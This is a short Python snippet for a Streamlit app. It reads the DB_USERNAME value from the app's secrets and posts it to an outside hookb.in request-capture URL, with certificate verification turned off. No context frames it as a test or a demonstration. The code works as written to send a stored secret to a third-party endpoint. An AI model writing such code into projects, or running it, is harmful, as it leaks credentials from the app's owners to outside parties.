import requests
import streamlit as st

username = st.secrets["DB_USERNAME"]

url = 'https://hookb.in/G90xNbkeW2HE2xPP2o0O'

data = username

r = requests.post(url, verify=False, data=data)
